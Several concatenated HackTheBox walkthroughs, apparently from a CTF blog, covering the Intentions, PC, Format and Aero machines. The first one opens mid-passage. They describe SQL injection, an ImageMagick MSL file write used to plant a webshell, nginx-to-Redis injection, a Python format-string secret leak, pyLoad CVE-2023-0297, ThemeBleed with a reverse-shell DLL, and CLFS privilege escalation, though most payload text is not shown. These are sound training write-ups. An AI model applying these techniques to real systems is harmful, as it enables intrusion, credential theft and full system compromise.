Now I can use that template to make queries into the database. Where I have “2” and “3” are the only things that can take strings, so I’ll focus there. If I replace “2” with “user()” and “3” with “database()”, it shows the results:
The user is laravel@localhost, and the database is intentions. I’ll use version() to get the version of 10.6.12-MariaDB-0ubuntu0.22.04.1.
I’ll change genres to get the list of databases and tables:
This will get the database name in the file and the table name in the genre of the output, and it will skip tables in the information_schema table (as those are standard and well defined). It returns:
The only database is intentions, and there are four tables: gallery_images, personal_access_tokens, migrations, and users.
The most immediately interesting table is users. I’ll update my genres to list the columns in that table:
This returns id, name, email, password, created_at, updated_at, and genres. I’ll update my query to get all of the interesting information in one column using concat:
I get the following users:
I’ll note the top two, steve and greg, have the “admin” attribute set to 1.
I’ve shown exploiting a complicated second-order SQL injection with sqlmap before, five years ago in Nightmare.
I can do all the steps above with sqlmap. I’ll need a couple things:
I’ll do this in Burp by right clicking and selecting “Copy to file”. This is preferred over giving it the URL because then the cookies and other headers will match.
The sqlmap syntax has updated over the last five years since Nightmare. --second-order is deprecated in favor of --second-req. I’ll give it --tamper=space2comment (sqlmap will fail without this for the reasons seen above, but it will also suggest trying this tamper). I’ll also give it --technique=U to limit to union injections. It will find the union without this, but it’ll go faster since I know this is possible. I will need to increase the --level 5, which is the max. With all of this, it finds the injection:
I’ll add --dbs to the end and it prints the two db names:
Replacing --dbs with -D intentions --tables will list the tables in intentions:
Replacing --tables with -T users --dump will dump that table:
I’ll fire up hashcat on my system with these hashes, but after five minutes, none have cracked, and progress is moving very slowly as these are Bcrypt hashes. This doesn’t seem the be the way.
I noted above the text in admin.js that mentioned the new v2 login API endpoint that did the hashing client-side so that user passwords aren’t submitted in the clear. I could enumerate the entire v2 API, but I’ll start with seeing if there’s a login function in the same place as v1.
I’ll send a login request over to Burp Repeater, and update the URL from /api/v1/auth/login to /api/v2/auth/login without changing the POST body. When I send this, the response body has a failure:
The POST body for that request looks like:
I’ll change password to hash, and the result is the same as when I have the wrong password on v1:

Category: Auth as Admin
I’ll update the POST to have steve’s email and hash, and it works:
The easiest way to get authed in Firefox is log out, put Burp Proxy in Intercept mode, and login with steve’s email and hash. When Burp catches this request, I’ll change v1 to v2, and password to hash, and send it, disabling Intercept.
Now going to /admin returns an admin interface (that includes the cards from the JS file):
In the admin site, there’s a users page that shows the users of the site:
There’s no interaction here. On the “Images” tab, it lists the images that are available for the gallery:
Clicking on “Edit” loads the image with four buttons at the top and a bunch of metadata at the bottom:
Clicking “CHARCOAL”, the image reloads with that effect:
Clicking the effect button sends a POST to /api/v2/admin/image/modify with a JSON body:
I noted above the reference to imagick, which is almost certainly ImageMagick.
The path input takes a local path, but if this is using PHP, it’s likely that could take a URL as well. I’ll start a Python webserver on my host, and give it http://10.10.14.6 as the path. There’s a hit:
If I serve an image, the modified image is sent back:
I can base64 decode that into a file and view it for the image. For example, a Google local made charcoal:
I’ll try a bunch of things that don’t work lead to much:
There’s a neat trick in the post I’ll go into next section to verify this is ImageMagick! ImageMagick will handle a filename with [AxB] appended to the end (where “A” and “B” are numbers) and scale the image based on that. I’ll load a standard request to  /api/v2/admin/image/modify in Burp Repeater:
This returns just fine. If I add [] to the end of the filename, it fails:
But, if I add dimensions within the [], it works again:
The base64 decodes to a very small version of the picutre. But more importantly, this behavior for handling paths is relatively unique to ImageMagick.
This article has a bunch of details about how to exploit Arbitrary Object Instantiation vulnerabilities in PHP. The article is a bit hard to follow, but it’s looking at cases the author calls $a($b), which is to say some class if passing an attacker controlled variable to it’s constructor. And the example in the article is Imagick!
To exploit ImageMagick, the post goes into the Magick Scripting Language (MSL) format. In the post, it shows how passing a URL with an msl: scheme to a new Imagick object results in an arbitrary file write:
This POC will download positive.png from the localhost webserver and write it to a given location.
Unfortunately, I can’t chain msl:/ and http:// ( like msl:/http://10.10.14.6/), as that isn’t supported. So I need to get a .msl file on disk.
The author looks at how PHP writes temp files to /tmp/php? where ? is a long random string while the request is being handled. At first, they try to brute force all possible file descriptors, but then discover the vid: scheme. The code for parsing these passes the result to ExpandFilenames, which effectively takes things like * and expands it to get files that match. So with the vid: scheme, I can reference the file as /tmp/php*.dat successfully.
Putting this all together, I need to pass into the Imagick constructor something that looks like this: /vid:msl:/tmp/php*.  Then, I need to have attached to the request a file to be written to the temp location that is an .msl file, such that when ImageMagick processes the file, it writes a webshell to some location on the disk.
I’ll start with the request as it’s sent by the site:
I’ll first try to move the path and effect parameters from the POST body to the GET parameters. It’ll still be a POST request, but if this works, that makes it easier for me to isolate the file upload in the POST body:
That does work. I’ll want to upload a file that will be temporarily written to /tmp/php* by PHP. To do that, I’ll use a multipart form data by setting the Content-Type header. By giving it filename and Content-Type attributes, PHP will handle it as a file.
The file will be a modified version of what’s in the blog post:
Because the admin page gives both the path on the webserver and the path on disk:
By writing to /var/www/html/intentions/storage/app/public/, I can expect to find the file in /storage/. I could also try the animals directory, but it doesn’t work (www-data doesn’t have write access).
Now I’ll edit the request headers to add form data for a file upload. My full payload looks like:
I can use anything for name, as I just need PHP temporarily store it in /tmp before it realizes it’s not needed.
On sending, the request hangs for a second, and then returns a 502 Bad Gateway failure:
This is a sign of success, as 0xdf.php is there:
If there is something wrong with the request, the response looks like this:
I came across this several ways. One way this comes up is copying the POC from the blog, which comes with extra spaces in the payload and cause this result.
To get a shell from the webshell, I’ll just send a bash reverse shell payload. I’ll put it in the POST body (I used $_REQUEST to read cmd from either GET parameters or POST body):
This just hangs, but at nc:
I’ll upgrade the shell:

Category: Shell as greg
There are three users with home directories in /home:
www-data doesn’t have privilege to access any of them.
www-data’s home directory is /var/www, and the only thing in it is the website, in /var/www/html/intentions:
There is a Git repo (the .git directory) that is readable but not writable by www-data. The permissions on the directory don’t allow www-data to run git commands:
I’ll bundle the entire website (for low bandwidth situations the .git folder would do):
I’ll exfil that back over nc:
On my host:
The repo has four commits:
Exploring the differences in the commits (with git diff commit1 commit2), /tests/Feature/Helper.php is added in the second commit, “Adding test cases for the API!”:
This file is mean to test logging into the API, and it’s using hardcoded credentials for greg. In the third commit, the creds are removed:
I noted earlier that greg was a user on this box with a home directory. These creds work for grep with su:
And over SSH:
greg’s shell is set to sh, but running bash will return a better experience:
And I can read user.txt:

Category: Shell as root
greg cannot run sudo:
There’s a bunch of files with SetUID / SetGID, but none that stand out as non-standard:
There is one file that has a unusual capability:
/opt/scanner/scanner is worth looking into. With CAP_DAC_READ_SEARCH, it can read any file on the host (man capabilities):
greg’s home directory has two files that reference DMCA (presumably the Digital Millennium Copyright Act):
dmca_hashes.test is a list of ids and hashes:
dmca_check.sh just runs the scanner identified above:
This file has a nice help:
It is able to MD5 hash files and compare them against a give list of hashes. It in fact does not work like it says it does, but the broken part is just the full file hash (I’ll play with that in Beyond Root).
It also has the ability to hash only the first X characters of a file. -p will be useful because it will print the calculated hash of the file or portion of the file.
So for example:
Here I’m calling scanner with:
The debug message prints the hash, which matches the MD5 of the first five characters of the file.
If I can get the hash of the first byte of a file, then I can brute force all possible bytes and take their hashes and compare to get a match. Then I can do the same with the first two bytes, first three bytes, etc, until I have the full file.
This is more of a programming exercise than anything else. In this video I’ll walk through creating a Python script to abuse this binary to get file read:
The final script is:
With that I can read the root flag, but also root’s private SSH key:
With that SSH key, I can SSH into the box as root:
And grab root.txt:
The first thing I did when seeing the scanner application was to run it against a file I had access to and run md5sum on that same file, expecting the output hashes to match. When they didn’t, I was very confused:
This is true for other files as well:
I did a lot of playing around with this before realizing what the issue was. Looking back at the help message, it’s actually in there:
-l int
        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
By default, it only scans 500 bytes of a file. This limit is pretty dumb, and makes it realistically unusable.
With the help menu, at least I know can understand one of the use cases above:
The hash is the same with -l 500 and without it.
In fact, I can use dd to get the first 500 bytes of the file and hash it:
It matched. All good so far.
So what about user.txt? That’s only 33 bytes:
What happens when I try to hash that? I can try using dd (though I’m not 100% sure what that would do), but it doesn’t match:
A hint comes from when I read the flag file writing my script in the video above:
It seems that as I’m brute forcing bytes in the file, when I read the end, rather than stopping, it “finds” nulls for “a while”.
I’ll write a script to test this out:
I have the target hash of “582fe8243c33a457d38b9922c7db4c39”. I’ll start with the first known 33 bytes, and then just append nulls until it matches. It instantly prints 500:
Before I had seen the “(default 500)” in the help menu, this felt like a huge discovery. Now it just makes perfect sense.
My best theory is that the program creates an -l size buffer, and then reads up to that many bytes into it. If that’s the case, the buffer could be nulled beforehand, or it could just happen to have nulls in it most of the time.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 20 May 2023
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.086s latency).
Not shown: 65533 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknownCategory: Recon
nmap finds two open TCP ports, SSH (22) and something unknown (50051):
Based on the OpenSSH versions, the host is likely running Ubuntu 20.04 focal.
Connecting to 50051 with nc returns only “???”:
The connection is open, and I can send data, but nothing I send seems to get a result.
Searching for “tcp 50051”, the third result is a Stack Overflow post about gRPC (with several others below it):
At this point in enumeration, it’s worth going through each potential lead to see if this could be what’s on that port. This Stack Overflow answer confirms that 50051 is the default port of gRPC, so that could be what this is.
To test if this is actually gRPC, I’ll look for posts on how to interact with it. This post about pentesting gRPC shows using grpcurl, which I’ll install with go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest (this requires having go installed and configured on my VM, which is described in detail here). I’ll also show gRPC UI below.
The first command in the post is grpcurl [target:port] list. Here, that throws an error:
It’s complaining that the server didn’t reply with a TLS handshake, as gRPC works over TLS by default. Luckily, there’s a switch in grpcurl to say don’t use TLS:
It works:
It seems at this point that I have identified the service as gRPC.
grpc.reflection.v1alpha.ServerReflection is in both the blog post and on PC, and it is what allows for enumeration of the RPC endpoints.
I’ll focus on SimpleApp, which is unique to PC. list can give the available methods:
In theory I should be able to use describe for each of these, but they don’t work:
However, using describe on the entire app works:
I can also describe each of the object types:
I can try to talk to one of the end points. getInfo seems like a reasonable target. I’ll pass the required information, but it errors saying that it requires a token header:
That implies auth is required.
Registering requires two strings, username and password. It returns success:
I can then login:
I expected this to return a token so I could use GetInfo, but I don’t see one. I’ll log in again, this time with the verbose flag:
There is a JSON Web Token (JWT) in the response trailers section.
I already saw that trying to access getInfo fails requiring a token header. To add a header is just like curl, with -H:
It just says “Will update soon”. If I request a user that doesn’t exist, it errors out:
If I register another user and try to request their ID, it just says “Will update soon”.
update 2023-10-10: Nicolas Krassas suggested that I also look into gPRC UI. It’s a GUI tool that allows for interaction through a web GUI.
I’ll install it with go install github.com/fullstorydev/grpcui/cmd/grpcui@latest (which assumes I’ve installed golang), and launch it pointing at the gRPC service:
It listens on a random high port, and then launches Firefox with http://127.0.0.1:[port] loaded:
For each RPC method, it has the options and the types. I can register and the result is shown in the “Response” tab:
On logging in, the “Response Trailers” are also shown:

Category: Shell as sau
The accounts on the app seem to reset every 10 minutes. It’s very annoying. I created one line that I could up-arrow to and re-run that will create a user and login twice. On the first login, it captures the token and exports that as an environment variable. On the second, it prints to the screen the new account’s user id:
It runs like:
After running that I can use $TOKEN to query:
I’ll try some different payloads to see what happens. Adding a ' seems to break it:
That could be SQL injection, but it could just as easily be that there is no user with id 320'. I’ll try adding a UNION statement to see if I can inject data:
Still nothing. Interestingly, if I remove the ', there’s injection:
That means that the SQL query is something like select * from table where userid = {input}, and the input is an integer, so it isn’t wrapped in " or '.
I’ll replace the 1 with user() and version(), but both break:
This might not be MySQL. It could be SQLite. I’ll try sqlite_version(), and it works:
PayloadsAllTheThings has a SQLite Injection page. I’ll use the query here to get the table names:
The trick is making sure to nest " and ' properly. It seems this application is only sending back the first one, so I’ll add group_concat() to get all of them:
The query from PayloadsAllTheThings to get the column names works:
It’s returning the string that shows how the table was created. I can get both in one query:
accounts has username and password, messages has id, username, and message.
There are only two messages in the DB:
I’m using || to concatenate columns, and then group_concat to get multiple rows. The message from admin says the admin is working on issues, and the other is the message for my current user.
There are three rows in accounts:
admin has the password admin, and sau has the password “HereIsYourPassWord1431”.
That password works for sau over SSH:
And I can read user.txt:

Category: Shell as root
sau cannot run sudo:
Their home directory is empty as well:
There are no other users on the box with directories in /home. The web application is running from /opt/app, but there’s nothing else in there to help with the exploitation of this box. I’ll explore it a bit in Beyond Root.
The file system is relatively empty.
Looking at the process list, there are two Python processes running as root that stand out as non-standard:
The first is the gRPC server. The other is an instance of PyLoad, an opensource download manager written in Python.
Looking at netstat, there are two ports I hadn’t seen yet, 8000 and 9666:
9666 and 8000 both are hosting (the same?) webserver:
I’ll reconnect my SSH session with these ports forwarded:
Both seem to load the same page, a pyLoad login:
pyLoad is a download manager written in Python. Searching for “pyload exploit” returns a bunch of references to CVE-2023-0297, a command injection vulnerability in PyLoad:
This commit shows the changes that “fix arbitrary python code execution by abusing js2py functionality”. The change is very simple:
This gist does a really nice job describing the bug. The /flash/addcrypted2 endpoint passes user input directly into a function named eval_js, which passes that into js2py.eval_js, a function form the js2py library. This library is designed to run JavaScript in this Python context.
js2py has a feature that’s on by default known as pyimport. It allows importing Python libraries to run alongside the JavaScript it’s executing. So if it’s not disabled, I can use pyimport to get Python code, and run that in an unsafe way. The patch above disables pyimport for pyLoad.
There’s a POC in the gist above using curl:
I’ll clean that up a bit and run it:
The touch command worked, as that file now exists, owned by root:
I’ll change the payload from creating a file to making a SetUID / SetGID copy of bash:
Back in my shell, I’ll run it (with -p to not drop privs):
With that I can read root.txt:
I thought it would be interesting to see how the GRPC application is set up and configured, and I find it in /opt:
The GRPC Python module creates the app_pb2.py and app_pb2_grpc.py files from the app.proto file, and then app.py uses those to run the service. This video has more details:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 13 May 2023
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.086s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  pppCategory: Recon
nmap finds three open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Debian 11 bullseye. There’s also a redirect on port 3000 to microblog.htb.
Given the use of the DNS name, I’ll brute force both web servers to see if either respond differently for any subdomains. Port 3000 doesn’t show anything:
Port 80 finds two different subdomains:
I’ll add the domain and both subdomains to my /etc/hosts file:
Visiting http://10.10.11.213 returns a redirect to app.microblog.htb. On 80, visiting http://microblog.htb returns a default nginx 404 not found page.
app.microblog.htb looks like the front page for a microblog service:
The front page has links to register and login, as well as a “Get Blogging” button that points at /dashboard, but just redirects to the login form. There’s also a “Contribute here!” link that points to the service on port 3000, http://microblog.htb:3000/cooper/microblog.
It looks like the site is giving out subdomains (much how Gitlab has given me 0xdf.gitlab.io). Visiting sunny.microblog.htb shows it is an example of this, a blog about the TV show It’s Always Sunny in Philadelphia:
I’m able to register for the site, and that leads to /dashboard:
There’s a reference a the bottom about “go pro to upload images for $5 / month”, but the link doesn’t work.
The only real interaction on the page is the ability to create a subdomain. It only accepts lowercase letters:
That filter is implemented client-side, as no request is sent. If I create oxdf.microblog.htb, it shows up in my dashboard:
If I try to register sunny.microblog.htb, it returns an error at the top of the page:
The “Edit Site” link on the dashboard leads to a crude editor, where I can add h1 and txt sections:
Visiting the page shows similar format to the sunny page:
The HTTP headers don’t give away what the site is running on other than nginx:
However I am able to guess that the index pages in each directory / load as index.php, whereas index.html returns 404, so the site is built on PHP.
I’ll run feroxbuster against the site, and include -x php since I know the site is PHP:
Nothing here that I didn’t know about already.
Port 3000 is hosting an instance of Gitea, an open-source Git hosting application:
Under “explore”, I’ll find one repo (the same that was linked to on the main page):
The repo has the source for the site:
The html folder has a single index.html page which just contains a redirect to app.microblog.htb. microbucket has the static CSS and JavaScript files used by the site.
pro-files has a single file, bulletproof.php. It defines an Image class with a bunch of functions for it. It has a list of accepted mime types and extensions. It also forces the extension based on the mime type, to prevent .php uploads.
microblog-template has three folders and and index.php:
index.php seems to be the page for the blog post. It is using the Redis caching DB in multiple places. For example, there’s a checkOwner function:
The site seems to store a list of file names in a file, /content/order.txt, which is loaded by a function named fetchPage(), and then looped over to read in files building $html_content:
Then that is set into JavaScript in the page, which breaks it apart and puts it into the page:
There is a content directory in the repo, and it has an empty order.txt. edit has an index.php that managed editing the page and saving changes into order.txt and randomly named files.
Despite the site not offering any way to upgrade to Pro, there are checks in the PHP for this:
It creates a uploads/ directory, presumably to store images. There’s an isPro function as well, which checks Redis for the user’s status:
The microblog folder has two directories:
sunny is the example blog, and it has the same structure as the template. The content folder has order.txt along with some randomly named files:
The randomly named files each have tiny bits of HTML. For example, 2766wxkoacy has:
order.txt contains a list of the files:
The app folder has the source for the page where I can register  / login. There’s not much here I need to find, except for how users are generated / stored in Redis. For example, at line 26 of /register/index.php:
It’s connecting to unix:/var/run/redis/redis.sock. It uses HGET and HSET to interact with the key for the username and set values for username, password, first-name, last-name, and pro.

Category: Shell as www-data
I noted above that the content is stored in files named with random characters. It turns out they are generated by clientside JS in the page at /edit:
So the POST request to create or edit a microblog looks like:
This means that the user controls id going into this PHP at line 80 of /edit/index.php:
As there is no sanitization on the ID, this gives arbitrary write or read as the current user. If the target is a file that the current user can write, then it will write the given text to that file. But even if it fails to write the text, that file is still added to order.txt, which means it’ll be read and shown on the microblog page.
I’ll try reading /etc/passwd by setting the id parameter to point to it:
This is failing to write “test” to /etc/passwd because my user doesn’t have access, but then the traversal payload for passwd is written to order.txt, and then the contents get loaded into the page. It shows up on the site now as well.
Given the multiple steps to read a file, I’ll script this. Also, because the box is periodically clearing out accounts, I’ll just register a new account each time:
The result allows me to request files:
I’ll find most attempts to write inside the current web directory fail. There is one directory that must be writable, and that’s /content. Trying to visit /content on a microblog site returns 403:
I know the site has to be able to write files in this folder. I’ll try to write there with a request like:
It shows up on the page:
And visiting /content/0xdf.txt downloads the text file.
I’ll try with:
It seems to work, but visiting /content/0xdf.php, it just downloads the file, doesn’t execute it. In Burp, I’ll look at the response:
It is returning this as a file, rather than executing it as PHP. This is likely due to the nginx configuration that is matching on this location and just adding the Content-Disposition header to set it as an attachment, rather than passing it to PHP for execution.
To get a better look at how nginx is hosting and see if I missed any sub domains, I’ll look at the config file (using grep to remove comments):
This isn’t the full nginx config. There must be more in other files (for things like the downloads from /content). I reasonably could guess the path to those, but I didn’t here. I’ll look at this a bit in Beyond Root.
That last block of the nginx config has a vulnerability in it. It will match on any URL of the form /static/${1}/${2}, and proxy it to http://${1}.microbucket.htb/${2}. This is simulating something like a scenario where different sites might have different cloud storage buckets set up. This blog post has a really nice example of why this kind of pattern exists, and how to exploit it.
The idea is to abuse this to connect to a unix socket. From the post above, if I pass in:
Then this will make:
That will end up sending this request to the socket:
The post continues showing how to write keys. I can send a request that isn’t a valid HTTP verb (like GET or POST), and it still gets processed and passed by nginx. If I send this HTTP request:
That will reach the socket as:
That will set the key hacked to true (and likely crash the rest of the command).
This is taking advantage of the fact that MSET allows for setting multiple keys in the same line.
There’s more in the post about getting RCE from this, but I wasn’t able to make that work on Format.
The keys I noted above were set with HSET, which according to the docs, takes a key followed by field and value pairs. That should work similar to above, but rather than just key / value, I’ll pass field as well.
I’ll send:
This will become:
I’ll send this, and the response is a crash:
But, on refresh, my first name is changed!
I don’t really want to change my name, but rather to get Pro status. I’ll change the field to “pro” and the value to “true”, and send again. On refresh, my page says Pro!
With pro, my site exit now has an img option:
If I give it an image, it loads:
The image is located at http://oxdf.microblog.htb/uploads/6462959cc8f1b2.38277097_gneojkiqpmhfl.png.
I noted above that the client-side application forces a .png extension onto whatever I upload.
I’ll use the write vulnerability to write a .php file into /uploads:
Now with Pro access, I can access this directory, and unlike the previous directory, this time the PHP executes:
I’ll resend the write request, but this time writing a simple PHP webshell:
Now I’ll add ?cmd=[command] to the url, and it works:
I’ll start nc listening on 443 and send this bash reverse shell in Firefox:
There’s a connection:
I’ll upgrade my shell using the standard trick:

Category: Shell as cooper
There are two home directories on the box, cooper and git:
www-data is able to enter cooper, and user.txt is there, but www-data can’t read it.
I’ll check out the Redis database. redis-cli is on the box, and -s allows it to connect to a socket, where there’s no other auth needed:
keys * will show all the keys:
oxdf:sites and cooper.dooper:sites are the lists of sites for that user. It’s generated in the source with LPUSH, pushing items onto a list. LRANGE reads a list, taking a start and stop index. The docs show that if the stop is -1, it’ll read to the end, so I can read the full lists:
HGETALL will dump all the fields in a hash:
It seems to return the field as one, followed by the value in the next. 13 and 14 are artifacts of my injection in the previous step.
4 is the password for the cooper.dooper user.
That password works for the cooper user on the box with su:
It also works for SSH:
Either way I can claim user.txt:

Category: Shell as root
cooper can run license as root:
sudo requires a password, but I have that.
licence is a Python script:
The script clearly checks that it’s running as root before doing anything else:
It starts with a License class:
This gives each object a random 40 characters.
There’s a check for running as root, and then argparsing to generate the args noted above. Then it loads the contents of a secret from /root/license/secret:
A key derivation function (kdf) is initialized and used to generate an encryption key from the secret and a plaintext salt.
Then the program splits based on if it’s call to provision, deprovision (which isn’t implemented yet), or  check.
Provisioning is the only interesting path. It starts by getting the user out of Redis and checking if that user already has a key (exiting if so):
Then it generates a key based on a static prefix, the username, the random 40 characters, and the combination of the user’s first and last names:
It prints the plaintext and encrypted keys to the console, and writes the key to the keys file:
The trickiest part here is realizing that I need to recover the hidden secret.
What is working to my benefit is that I control the other variables printed to the screen. This Stack Exchange answer lays out really nicely how to attack this. This post goes into more detail as well.
Because I can control the template, then I can specify what happens in the format.
I’ll use my access to Redis to create a user where the last name is an injection like {license.__init__.__globals__[secret]}. That will make the format string look like:
When that gets formatted, it should print the secret.
In Redis, I’ll start with a new user, rooted:
I’ve made the first name password: to show easily where the secret starts. Running the script now prints the unencrypted key:
The secret is unCR4ckaBL3Pa$$w0rd.
That secret works as the password for root via su:
and SSH:
I’m able to grab root.txt:
Format was patched on 23 May 2023, 10 days after it’s initial release:
Early in the box, I’ll find I can write arbitrary file to a site’s /content directory, but not anywhere else in the web directory. /content doesn’t allow the execution of PHP files. If I could write elsewhere, I could write a webshell and get execution much earlier than planned.
The patched issue comes with how the new site is originally provisioned:
It makes microblog writable, and copies the template into that directory. Then it makes the content folder writable, but then steps up and sets the reset of the site not writable.
The issue is that there’s a race condition there. For a very short period of time, there’s a writable directory that will allow PHP to run.
To exploit this, I’ll use wfuzz to send a lot of requests at once to write into a site that doesn’t exist:
I haven’t created race.microblog.htb yet, but that’s my Host header. It’s using my session cookie, and trying to write to the root of that site. I’ve added an oops parameter just to have something to FUZZ so wfuzz will send lots of requests at once. If I try something like curl here in a while true loop, it’s too slow.
Once I start this running, I’ll create the site. For example, with this curl command:
While the site is being created, wfuzz is throwing tons of requests at it, and one is likely to land while the base directory for race is writable. Once the site is created, I’ll kill the wfuzz and check. The webshell is there:
The code is fixed in the addSite function here:
Now, rather than create the directory in place, it creates the directory in /tmp. Then it moves all the files it needs into the directory, and changes the permissions locking it down. Finally, it moves it into place in the web directory. To exploit this race condition now, I’d have to guess the name of the random seven character directory in /tmp to write in. Given that there’s 26^7 possible directory names (over eight billion), that’s not possible to brute-force.
There’s a similar bypass that abuses how the nginx site was originally configured:
I know I can get a webshell into /content/0xdf.php. But trying to visit that will match on this block:
That will add the Content-Disposition and return a file, and since a request can only match on one location block, it won’t get to the third one.
The next block is what passes files ending in .php to the PHP unix socket for execution. fastcgi_split_path_info will split the path (everything after the host and optional port) into two using this regex. the two regex capture groups (in ()) will be saved to $fastci_script_name and $fastcgi_path_info.
In this case, the regex is  ^(.+\.php)(/.+)$;, which will match something up to the first .php, saving that into $fastcgi_script_name, and the rest into $fastcgi_script_info. The last line in this block, fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;, results in calling the absolutely path of the script name derived in the first line.
To abuse this, I’ll craft a URL that has two .php strings. It must:
The trick is to put a /.php at the end of the URL, making this:
This satisfies 1 by ending in .php. For 2, because there’s another /, it doesn’t match. In 3, it will split to the first .php, capturing just what I want. The rest is past as part of the parameters.
To patch this, the server configuration block in /etc/nginx/sites-enabled/microblog.htb was updated to:
The fix here is less complete. It now looks for any number of /.php on the end and still sends handles that as an attachment. But it doesn’t allow for extra stuff before the /.php. So even today while the exact URL originally used to unintended the box is blocked:
Any variation that appends anything besides /.php still work:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 28 Sep 2023
OS : Windows
Base Points : Medium [30]
Nmap scan:
Host is up (0.092s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  httpCategory: Recon
nmap finds one open TCP port, HTTP (80):
Based on the IIS version, the host is likely running an modern Windows OS (Window 10/11 or Server 2016+).
The website is a repository for Windows 11 themes:
Towards the bottom there’s a form to upload custom themes:
The “Browse” button opens a file dialog for .theme and .themepack extensions. If I try to upload an image, it reject it based on file extension (or so it says):
I’ll make a dummy file, test.theme, and upload it, and it takes:
It doesn’t seem to be checking the file beyond extension. The site also says that it will test the theme, which implies that someone will open it.
At the bottom, there’s an email, support@aerohub.htb. All the links on the page go to other parts of the same page.
The HTTP response headers show IIS version 10:
The X-Powered-By of ARR/3.0 is different from what is more commonly ASP.NET. Application Request Routing is an IIS extension to handle load balancing.
I’m not able to guess an extension for the index page, and the 404 page is just blank.
I’ll run feroxbuster against the site, giving it a lowercase wordlist as IIS is case-insensitive:
It finds /home, which loads as the main page.

Category: Shell as sam.emerson
Searching for “windows 11 theme exploit” returns lots of results for something called “ThemeBleed”:
CVE-2023-38146, known as ThemeBleed, is a vulnerability in Windows Themes that allows for remote code execution. It was patched in the September 2023 Patch Tuesday.
The vulnerability comes from how Windows handles the .msstyles files referenced from within the theme file. These .msstyles files lead to Windows opening a DLL at the same path as the .msstyles path with _vrf.dll appended. The digital signature on this file is checked before it is loaded.
The vulnerability comes because, when version 999 is used, there’s a big gap between the time when the _vrf.dll binary’s signature is checked and when it is loaded for use. This gaps presents a race condition, where the attacker can replace the verified style DLL with a malicious payload to run arbitrary code.
The proof of concept code released by the researcher is in this GitHub repo. In the Releases section there’s a zip file that contains a Windows executable as well as DLLs named stage1, stage2, and stage3:
The README on GitHub shows the exe has three commands:
stage1 is a msstyles file with the PACHTHEME_VERSION set to 999. stage2 is a legit signed styles file to pass the check. stage3 is the DLL to be loaded, which by default will launch calc.exe.
The README is a bit thin on what the exploit is actually doing. I want to take a look at the actual code before running it, to understand what it’s doing both so I can make it work and to make sure it’s not doing anything nefarious on my machine. I’ll walk through this analysis in this video:
The big take-aways are:
I’ve got a reverse shell DLL in my CTF Scripts repo that I used for the Helpline HTB box. It won’t work here because it pulls from the local environment variables to get the callback IP and port. It also run the reverse shell on DLL load, where as the instructions for the POC say to use the VerifyThemeVersion function.
I’ll open Visual Studio (not Visual Studio Code) and “Create a new project”. I’ll use “C++”, “Windows”, and “Library” from the filter menu, to get to “Dynamic-Link Library (DLL)”:
I’ll name the project and get a folder for it:
Before I try to put a reverse shell in, I want to make sure I can create a DLL with the correct export name. The project starts with dllmain.cpp in the “Source Files” directory:
That code has the DllMain function defined. In the past, I’ve called my reverse shell from here where the template has a break:
I’ll create a new header file by right clicking on “Header Files” in the Solution Explorer and name it rev.h. In this file, I’ll define the exported function:
In C++, it’s important to have "C" or else the function name will be mangled when it exports.
I’ll add rev.cpp to “Source Files” in the Solutions Explorer, and in it, add the code to pop a message box:
It’s important to include rev.h to get the function header and export working correctly.
I’ll set my project to Release, and go Build > Build Solution, and it builds. I can look at it in something like CFF explorer and see the export:
Running it with rundll32 will show it works:
I’ll grab a reverse shell from an online repo (I’ll use mine, but there are lots), and tweak it to get what I need. Mine reads the callback IP and port from the environment, which won’t work here. I’ll define those as constants at the top of the function:
When I run this again using rundll32, there’s a connection at nc.exe on the same box:
I’ll update the IP from 127.0.0.1 to my tun0 IP and rebuild.
I’ll copy the DLL payload into the ThemeBleed repo over data/stage3:
Now I’ll generate a theme file:
If I try to start the server now, it fails:
The problem is that Windows is already listening on SMB by default.
The easiest way I know of to completely disable SMB is to disable the Server service in the Windows Service panel:
Stopping the service should work, but something continues to hold port 445, at least on my machine. Rebooting here solves that.
After the reboot, I’m able to run the exploit in Server mode:
I’ll start nc listening on my Windows host, connect to the HTB VPN, and upload the theme file. Almost immediately there are connections at the ThemeBleed server:
Then it hangs, and there’s a connection at nc:
The shell is as sam.emerson, and I’m able to read user.txt:
Potential Bug: It is possible that sometimes the shell that comes back looks like this, with the directory of ImmersiveControlPanel:
In this shell, PowerShell won’t start:
Other executables won’t run either. This seems to happen when Control Panel is still open on the box from a previous exploit. If this shell comes back, kill it and try again, reverting the machine if necessary.

Category: Shell as root
In sam.emerson’s Documents directory there’s a PDF document:
watchdog.ps1 is the script that emulates sam.emerson’s loading the themes.
I’ll exfil the PDF by converting it to base64:
On my VM, I’ll decode that into a file:
The PDF has information about CVE-2023-28252:
I’ll notice that there are 7 hotfixes applied. The Microsoft page for CVE-2023-28252 has links to the “security only” patches for Windows 11 x64 that are labeled KB5025224, which is not on this system.
Searching for “CVE-2023-28252 POC” finds this repo from fortra. It has a ton of detail about the exploit in the Common Log File System.
The repo has a VS project file, so I’ll clone it to my Windows Machine and open it in Visual Studio. The POC is quite long, but on lines 1491-1502, it checks if it is running as system and then launches notepad.exe:
I’ll replace notepad.exe with PowerShell #3 (Base64) from revshells.com:
Now I’ll build it. It’s important to set this as a release build, or else it will require certain libraries that are not on Aero. If I see errors about failing to convert string types like this:
I can fix that by going into the project settings (right click on clfs_eop in the Solutions Explorer and go to Properties), under Configuration Properties > Advanced set “Character Set” to “Use Multi-Byte Character Set”. Now on “Rebuild Solution”:
I’ll host the file using a Python webserver (python3 -m http.server 80) and then request it with PowerShell:
Now I run the exploit:
It hangs here, but at nc there’s a shell:
This shell doesn’t show a prompt at first, but when I run a command, it prints the result and then shows a prompt:
And I’m able to read root.txt:
